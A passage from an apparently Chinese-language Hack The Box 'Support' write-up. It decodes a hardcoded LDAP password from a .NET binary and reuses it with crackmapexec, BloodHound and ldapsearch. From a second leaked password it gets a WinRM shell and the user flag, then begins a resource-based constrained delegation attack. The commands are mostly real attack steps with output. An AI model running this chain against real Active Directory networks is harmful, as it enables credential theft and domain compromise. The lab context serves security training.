class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/userinfo]<br>└─$ strings UserInfo.exe                 <br>!This program cannot be run in DOS mode.<br>.text<br>`.rsrc<br>@.reloc<br>,Er<br>,ZsE<br>BSJB<br>v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span><br>#Strings<br>#GUID<br>#Blob<br>&lt;Main&gt;d__0<br>&lt;&gt;u__1<br>Task`<span class="hljs-number">1</span><br>CommandLineParser`<span class="hljs-number">1</span><br>TaskAwaiter`<span class="hljs-number">1</span><br>IParserResult`<span class="hljs-number">1</span><br>Int32<br>&lt;OnExecuteAsync&gt;d__2<br>Command`<span class="hljs-number">2</span><br>Int64<br>&lt;Module&gt;<br>&lt;Main&gt;<br>get_ASCII<br>mscorlib<br>ParseAsync<br>OnExecuteAsync<br>get_PropertiesToLoad<br>Protected<br>AwaitUnsafeOnCompleted<br>get_IsCompleted<br>System.Collections.Specialized<br>&lt;UserName&gt;k__BackingField<br>&lt;LastName&gt;k__BackingField<br>&lt;FirstName&gt;k__BackingField<br>&lt;Verbose&gt;k__BackingField<br>MatthiWare.CommandLine.Abstractions.Command<br>getPassword<br>enc_password<br>get_Message<br>IDisposable<br>Console<br>set_AppName<br>get_UserName<br>set_UserName<br>get_LastName<br>set_LastName<br>get_FirstName<br>set_FirstName<br>username<br>FromFileTime<br>DateTime<br>FindOne<br>MatthiWare.CommandLine<br>WriteLine<br>IAsyncStateMachine<br>SetStateMachine<br>stateMachine<br>ValueType<br>set_AuthenticationType<br>OnConfigure<br>ReadOnlyCollectionBase<br>get_Verbose<br>set_Verbose<br>verbose<br>Dispose<br>Create<br>&lt;&gt;<span class="hljs-number">1</span>__state<br>Write<br>RequiredAttribute<br>CompilerGeneratedAttribute<br>GuidAttribute<br>DebuggableAttribute<br>ComVisibleAttribute<br>AssemblyTitleAttribute<br>NameAttribute<br>AsyncStateMachineAttribute<br>DefaultValueAttribute<br>AssemblyTrademarkAttribute<br>TargetFrameworkAttribute<br>DebuggerHiddenAttribute<br>AssemblyFileVersionAttribute<br>AssemblyConfigurationAttribute<br>AssemblyDescriptionAttribute<br>CompilationRelaxationsAttribute<br>AssemblyProductAttribute<br>AssemblyCopyrightAttribute<br>AssemblyCompanyAttribute<br>RuntimeCompatibilityAttribute<br>value<br>UserInfo.exe<br>System.Threading<br>Encoding<br>System.Runtime.Versioning<br>FromBase64String<br>ToString<br>GetString<br>MatthiWare.CommandLine.Abstractions.Parsing<br>get_Task<br>FindAll<br>Program<br>get_Item<br>System<br>CancellationToken<br>cancellationToken<br>Main<br>System.Reflection<br>ResultPropertyValueCollection<br>StringCollection<br>SearchResultCollection<br>ResultPropertyCollection<br>SetException<br>Description<br>UserInfo<br>AsyncTaskMethodBuilder<br>ICommandConfigurationBuilder<br>&lt;&gt;t__builder<br>DirectorySearcher<br>FindUser<br>GetUser<br>printUser<br>CommandLineParser<br>TaskAwaiter<br>GetAwaiter<br>set_Filter<br>IEnumerator<br>GetEnumerator<br>.ctor<br>.cctor<br>System.Diagnostics<br>UserInfo.Commands<br>DiscoverCommands<br>UserInfo.Services<br>System.Runtime.InteropServices<br>System.Runtime.CompilerServices<br>System.DirectoryServices<br>DebuggingModes<br>get_Properties<br>AuthenticationTypes<br>MatthiWare.CommandLine.Core.Attributes<br>GetBytes<br>args<br>System.Threading.Tasks<br>Contains<br>System.Collections<br>commandOptions<br>GlobalOptions<br>FindUserOptions<br>GetUserOptions<br>CommandLineParserOptions<br>options<br>get_HasErrors<br>Concat<br>Object<br>get_Default<br>SearchResult<br>GetResult<br>SetResult<br>get_Current<br>get_Count<br>Start<br>Convert<br>last<br>first<br>MoveNext<br>System.Text<br>GetExecutingAssembly<br>LdapQuery<br>query<br>DirectoryEntry<br>entry<br>WrapNonExceptionThrows<br>UserInfo<br>Copyright <br>  <span class="hljs-number">2022</span><br>$<span class="hljs-number">5</span>a280d0b<span class="hljs-number">-9f</span>d0<span class="hljs-number">-4701</span><span class="hljs-number">-8f</span>96<span class="hljs-number">-82e2</span>f1ea9dfb<br><span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>.NETFramework,Version=v4<span class="hljs-number">.8</span><br>FrameworkDisplayName<br>.NET Framework <span class="hljs-number">4.8</span> <br>UserInfo.Program+&lt;Main&gt;d__0<br>/UserInfo.Commands.FindUser+&lt;OnExecuteAsync&gt;d__2<br>.UserInfo.Commands.GetUser+&lt;OnExecuteAsync&gt;d__2<br>username<br>Username<br>first<br>First name<br>last<br>        Last name<br>verbose<br>Verbose output<br>RSDS<br>C:\Users\<span class="hljs-number">0xdf</span>\source\repos\UserInfo\obj\Release\UserInfo.pdb<br>_CorExeMain<br>mscoree.dll<br></code></pre></td></tr></table></figure>

<p>7、还是没有什么大的发现，但是入口点感觉肯定在这里</p>
<p>8、这里参考任务4提示：由于这是一个 .NET 二进制文件，因此 DNSpy 和 ILSpy 等程序将有效返回源代码。或者，运行二进制文件（在 Windows 或 Wine 中）并使用 Wireshark 捕获身份验证。</p>
<p>9、我需要使用工具进行反编译来看看</p>
<p><img src="http://sh1yan.top/photo/Support-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/Support-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">this.entry = new DirectoryEntry(<span class="hljs-string">&quot;LDAP://support.htb&quot;</span>, <span class="hljs-string">&quot;support\\ldap&quot;</span>, password);<br><br>private <span class="hljs-type">static</span> <span class="hljs-built_in">string</span> enc_password = <span class="hljs-string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>10、通过跟进函数，发现了这个硬编码的密码信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">namespace UserInfo.Services<br>&#123;<br>	<span class="hljs-comment">// Token: 0x02000006 RID: 6</span><br>	internal <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Protected</span></span><br><span class="hljs-class">	&#123;</span><br>		<span class="hljs-comment">// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span><br>		public <span class="hljs-type">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span><br>		&#123;<br>			byte[] <span class="hljs-built_in">array</span> = Convert.FromBase64String(Protected.enc_password);<br>			byte[] array2 = <span class="hljs-built_in">array</span>;<br>			<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">array</span>.Length; i++)<br>			&#123;<br>				array2[i] = (<span class="hljs-built_in">array</span>[i] ^ Protected.key[i % Protected.key.Length] ^ <span class="hljs-number">223</span>);<br>			&#125;<br>			<span class="hljs-keyword">return</span> Encoding.Default.GetString(array2);<br>		&#125;<br><br>		<span class="hljs-comment">// Token: 0x04000005 RID: 5</span><br>		private <span class="hljs-type">static</span> <span class="hljs-built_in">string</span> enc_password = <span class="hljs-string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>;<br><br>		<span class="hljs-comment">// Token: 0x04000006 RID: 6</span><br>		private <span class="hljs-type">static</span> byte[] key = Encoding.ASCII.GetBytes(<span class="hljs-string">&quot;armando&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>11、这里需要解码一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3                    <br>Python <span class="hljs-number">3.11</span><span class="hljs-number">.7</span> (main, Dec  <span class="hljs-number">8</span> <span class="hljs-number">2023</span>, <span class="hljs-number">14</span>:<span class="hljs-number">22</span>:<span class="hljs-number">46</span>) [GCC <span class="hljs-number">13.2</span><span class="hljs-number">.0</span>] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; from base64 import b64decode<br>&gt;&gt;&gt; from itertools import cycle<br>&gt;&gt;&gt; pass_b64 = b<span class="hljs-string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span><br>&gt;&gt;&gt; key = b<span class="hljs-string">&quot;armando&quot;</span><br>&gt;&gt;&gt; enc = b64decode(pass_b64)<br>&gt;&gt;&gt; [e^k^<span class="hljs-number">223</span> <span class="hljs-keyword">for</span> e,k in zip(enc, cycle(key))]<br>[<span class="hljs-number">110</span>, <span class="hljs-number">118</span>, <span class="hljs-number">69</span>, <span class="hljs-number">102</span>, <span class="hljs-number">69</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">54</span>, <span class="hljs-number">94</span>, <span class="hljs-number">49</span>, <span class="hljs-number">97</span>, <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">36</span>, <span class="hljs-number">101</span>, <span class="hljs-number">55</span>, <span class="hljs-number">65</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">85</span>, <span class="hljs-number">102</span>, <span class="hljs-number">56</span>, <span class="hljs-number">120</span>, <span class="hljs-number">36</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">87</span>, <span class="hljs-number">120</span>, <span class="hljs-number">80</span>, <span class="hljs-number">87</span>, <span class="hljs-number">79</span>, <span class="hljs-number">49</span>, <span class="hljs-number">37</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">122</span>]<br>&gt;&gt;&gt; bytearray([e^k^<span class="hljs-number">223</span> <span class="hljs-keyword">for</span> e,k in zip(enc, cycle(key))]).decode()<br><span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span><br>&gt;&gt;&gt; <br></code></pre></td></tr></table></figure>

<p>12、使用crackmapexec工具验证账号密码是否可以使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb support.htb -u ldap -p <span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span><br>SMB         support.htb     <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)<br>SMB         support.htb     <span class="hljs-number">445</span>    DC               [+] support.htb\ldap:nvEfEK16^<span class="hljs-number">1</span>aM4$e7AclUf8x$tRWxPWO1%lmz <br></code></pre></td></tr></table></figure>

<p>13、感觉可以，那就上bloodhound开始信息收集吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ bloodhound-python -c ALL -u ldap -p <span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -d support.htb -ns <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span><br>INFO: Found AD domain: support.htb<br>INFO: Getting TGT <span class="hljs-keyword">for</span> user<br>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection <span class="hljs-title function_">error</span> <span class="hljs-params">(dc.support.htb:<span class="hljs-number">88</span>)</span>] [Errno -2] Name or service not known<br>INFO: Connecting to LDAP server: dc.support.htb<br></code></pre></td></tr></table></figure>

<p>14、出现报错了，先绑定下本地的hosts信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.174 dc.support.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> dc.support.htb<br></code></pre></td></tr></table></figure>

<p>15、继续开始信息收集</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ bloodhound-python -c ALL -u ldap -p <span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -d support.htb -dc dc.support.htb  -ns <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> --zip<br>INFO: Found AD domain: support.htb<br>INFO: Getting TGT <span class="hljs-keyword">for</span> user<br>INFO: Connecting to LDAP server: dc.support.htb<br>INFO: Found <span class="hljs-number">1</span> domains<br>INFO: Found <span class="hljs-number">1</span> domains in the forest<br>INFO: Found <span class="hljs-number">2</span> computers<br>INFO: Connecting to LDAP server: dc.support.htb<br>INFO: Found <span class="hljs-number">21</span> users<br>INFO: Found <span class="hljs-number">53</span> groups<br>INFO: Found <span class="hljs-number">2</span> gpos<br>INFO: Found <span class="hljs-number">1</span> ous<br>INFO: Found <span class="hljs-number">19</span> containers<br>INFO: Found <span class="hljs-number">0</span> trusts<br>INFO: Starting computer enumeration with <span class="hljs-number">10</span> workers<br>INFO: Querying computer: Management.support.htb<br>INFO: Querying computer: dc.support.htb<br>WARNING: DCE/RPC connection failed: SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>WARNING: DCE/RPC connection failed: SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)<br>WARNING: DCE/RPC connection failed: SMB SessionError: STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or function.)<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>INFO: Done in <span class="hljs-number">01</span>M <span class="hljs-number">43</span>S<br>INFO: Compressing output into <span class="hljs-number">20240320204202</span>_bloodhound.zip<br></code></pre></td></tr></table></figure>

<p>16、启动 neo4j 数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo neo4j start<br>[sudo] kali 的密码：<br>Directories in use:<br>home:         /usr/share/neo4j<br>config:       /usr/share/neo4j/conf<br>logs:         /etc/neo4j/logs<br>plugins:      /usr/share/neo4j/plugins<br>import:       /usr/share/neo4j/import<br>data:         /etc/neo4j/data<br>certificates: /usr/share/neo4j/certificates<br>licenses:     /usr/share/neo4j/licenses<br>run:          /var/lib/neo4j/run<br>Starting Neo4j.<br>Started <span class="hljs-title function_">neo4j</span> <span class="hljs-params">(pid:<span class="hljs-number">19004</span>)</span>. It is available at http:<span class="hljs-comment">//localhost:7474</span><br>There may be a <span class="hljs-type">short</span> delay until the server is ready.<br></code></pre></td></tr></table></figure>

<p>17、哗哗哗一阵分析，没啥头绪 &#x3D; &#x3D;</p>
<p>18、参考引导模式，使用 ldapsearch 枚举整个数据库的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ldapsearch -x -H ldap:<span class="hljs-comment">//support.htb -D ldap@support.htb -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &quot;dc=support,dc=htb&quot; &gt; res.txt</span><br><br><br>····<br><span class="hljs-meta"># support, Users, support.htb</span><br>dn: CN=support,CN=Users,DC=support,DC=htb<br>objectClass: top<br>objectClass: person<br>objectClass: organizationalPerson<br>objectClass: user<br>cn: support<br>c: US<br>l: Chapel Hill<br>st: NC<br>postalCode: <span class="hljs-number">27514</span><br>distinguishedName: CN=support,CN=Users,DC=support,DC=htb<br>instanceType: <span class="hljs-number">4</span><br>whenCreated: <span class="hljs-number">20220528111200.0</span>Z<br>whenChanged: <span class="hljs-number">20220528111201.0</span>Z<br>uSNCreated: <span class="hljs-number">12617</span><br>info: Ironside47pleasure40Watchful<br>memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb<br>memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb<br>uSNChanged: <span class="hljs-number">12630</span><br>company: support<br>streetAddress: Skipper Bowles Dr<br>name: support<br>objectGUID:: CqM5MfoxMEWepIBTs5an8Q==<br>userAccountControl: <span class="hljs-number">66048</span><br>badPwdCount: <span class="hljs-number">0</span><br>codePage: <span class="hljs-number">0</span><br>countryCode: <span class="hljs-number">0</span><br>badPasswordTime: <span class="hljs-number">0</span><br>lastLogoff: <span class="hljs-number">0</span><br>lastLogon: <span class="hljs-number">0</span><br>pwdLastSet: <span class="hljs-number">132982099209777070</span><br>primaryGroupID: <span class="hljs-number">513</span><br>objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==<br>accountExpires: <span class="hljs-number">9223372036854775807</span><br>logonCount: <span class="hljs-number">0</span><br>sAMAccountName: support<br>sAMAccountType: <span class="hljs-number">805306368</span><br>objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb<br>dSCorePropagationData: <span class="hljs-number">20220528111201.0</span>Z<br>dSCorePropagationData: <span class="hljs-number">16010101000000.0</span>Z<br>····<br><br></code></pre></td></tr></table></figure>

<p>19、发现某个用户的账号密码信息，尝试登录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> -u support -p <span class="hljs-string">&#x27;Ironside47pleasure40Watchful&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\support\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; dir<br><br><br>    Directory: C:\Users\support\Desktop<br><br><br>Mode                 LastWriteTime         Length Name<br>----                 -------------         ------ ----<br>-ar---         <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">6</span>:<span class="hljs-number">29</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt;<br></code></pre></td></tr></table></figure>

<p>20、获取到第一个flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; type user.txt<br><span class="hljs-number">4055646b</span>c297ff4f6cdd864e2aea3739<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>21、这个时候拥有了另一个域内账号了，再次查看 Bloodhound 数据，支持用户是共享支持帐户组的成员，该组GenericAll在计算机上具有 DC.SUPPORT.HTB 对象：</p>
<p><img src="http://sh1yan.top/photo/Support-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/Support-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p><code>我将滥用基于资源的受限委派。首先，我将在我的控制下将一台假计算机添加到域中。然后我可以充当 DC 为假计算机请求 Kerberos 票证，从而能够模拟其他帐户，例如管理员帐户。为此，我需要一个经过身份验证的用户，该用户可以将计算机添加到域中（默认情况下，任何用户最多可以添加 10 台计算机）。这是在ms-ds-machineaccountquota属性中配置的，该属性需要大于 0。最后，我需要对加入域的计算机具有写入权限（GenericALL在 DC 上我需要该权限）。</code></p>
<p><code>继续执行该计划，我们将使用evil-winrm将 Powermad 上传到目标服务器。随后，提供的命令将向 AD 对象添加一台假计算机，使用约束委派权限配置新的假计算机，并为这个新创建的实体生成密码哈希。</code></p>
<p>22、按照演练报告开始执行攻击</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools/PowerSploit]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> -u support -p <span class="hljs-string">&#x27;Ironside47pleasure40Watchful&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check 